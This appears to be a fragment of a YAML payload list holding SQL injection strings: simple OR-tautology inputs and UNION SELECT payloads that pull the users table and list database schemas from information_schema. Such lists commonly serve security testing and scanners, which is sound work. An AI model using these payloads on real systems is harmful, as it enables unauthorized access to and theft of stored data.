  - "' OR '1"
  - "1' OR '1"
  union:
  - "1' AND 1=2 UNION SELECT * FROM users --"
  - "1' UNION SELECT table_schema, table_name FROM  information_schema.columns WHERE table_schema != 'mysql' AND table_schema !=  'information_schema' --"

